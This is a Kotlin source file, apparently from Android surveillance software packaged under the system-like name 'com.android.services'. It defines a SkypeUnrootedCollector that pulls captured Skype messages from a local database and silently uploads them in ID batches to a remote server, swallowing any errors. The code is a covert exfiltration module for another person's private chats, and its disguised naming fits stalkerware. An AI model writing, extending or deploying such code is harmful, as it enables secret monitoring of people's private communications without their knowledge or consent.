package com.android.services.logs.collectors.im

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException

class SkypeUnrootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi
) :LogsCollector{
    override fun uploadLogs() {
        try {
            val skypeUnrootedList = localDatabaseSource.selectSkypeUnrooted()
            if (skypeUnrootedList.isNotEmpty()) {
                val endId = skypeUnrootedList[skypeUnrootedList.size - 1].id
                val startId = skypeUnrootedList[0].id
                val mRemoteServerHelper = RemoteServerHelper(
                    context,
                    AppConstants.SKYPE_UNROOTED_TYPE,
                    localDatabaseSource,
                    tosApi = tosApi,
                    startId = startId,
                    endId = endId
                )
                mRemoteServerHelper.upload(skypeUnrootedList)
            }
        } catch (e: Exception) {
            logException(
                "${AppConstants.SKYPE_UNROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                throwable = e
            )
        }
    }
}